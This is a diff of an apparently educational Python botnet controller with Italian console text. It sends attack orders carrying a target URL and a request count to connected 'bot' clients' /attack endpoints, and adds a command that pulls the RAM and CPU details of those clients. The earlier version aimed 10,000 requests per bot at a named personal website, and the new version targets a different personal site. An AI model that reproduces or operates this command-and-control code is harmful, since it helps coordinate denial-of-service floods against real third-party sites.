@@ -6,6 +6,7 @@ from concurrent.futures import ThreadPoolExecutor
 import requests
 
 server_address = ('10.0.2.15', 15200)
+# server_address = ('localhost', 15200)
 clients = []
 
 
@@ -56,6 +57,7 @@ def handle_console(e):
         print("2. Invia messaggio a tutti i client")
         print("3. Invia messaggio a un client specifico")
         print("4. Effettua richieste http")
+        print("5. Mostra informazioni di un client")
         print("0. Exit")
         scelta = int(input())
 
@@ -71,6 +73,8 @@ def handle_console(e):
             send_message_to_specific_client()
         elif scelta == 4:
             send_http_request()
+        elif scelta == 5:
+            get_client_info()
         else:
             print("Scelta non valida")
 
@@ -126,27 +130,49 @@ def send_http_request():
     Send an HTTP request to the specified URL
     """
 
-    url = 'https://marcorealacci.me'
-    myobj = {
+    url = 'https://federicoraponi.it'
+    post_data = {
         'url': url,
-        'number_of_requests': 10000
+        'number_of_requests': 5
     }
 
     if len(clients) == 0:
         print("Nessun client connesso")
         return
 
-    if input("Voi utilizzare tutti i bot connessi? S/N: ") == "S" or "s":
-        for client in clients:
-            requests.post(f"http://{client[1][0]}:80", json=myobj)
-    else:
-        client_address = int(input("Inserisci l'address del client a cui vuoi mandare il messaggio: "))
-        if client_address not in [client[1][1] for client in clients]:
-            print("Client non trovato")
-            return
-        else:
-            client = [client for client in clients if client[1][1] == client_address][0][1][0]
-            requests.post(f"http://{client}:80", json=myobj)
+    res = requests.post(f"http://{clients[0][1][0]}/attack", json=post_data)
+
+    print(res)
+
+    # if input("Voi utilizzare tutti i bot connessi? S/N: ") == "S" or "s":
+    #     for client in clients:
+    #         requests.post(f"http://{client[1][0]}/attack", json=post_data)
+    # else:
+    #     client_address = int(input("Inserisci l'address del client a cui vuoi mandare il messaggio: "))
+    #     if client_address not in [client[1][1] for client in clients]:
+    #         print("Client non trovato")
+    #         return
+    #     else:
+    #         client = [client for client in clients if client[1][1] == client_address][0][1][0]
+    #         requests.post(f"http://{client}/attack", json=post_data)
+
+
+def get_client_info():
+    """
+    Get the client info
+    """
+
+    if len(clients) == 0:
+        print("Nessun client connesso")
+        return
+
+    res = requests.get(f"http://{clients[0][1][0]}/client-info")
+
+    ram = res.json()['ram']
+    cpu = res.json()['cpu']
+
+    print(f"RAM: {ram}GB")
+    print(f"CPU: {cpu}")
 
 
 if __name__ == '__main__':
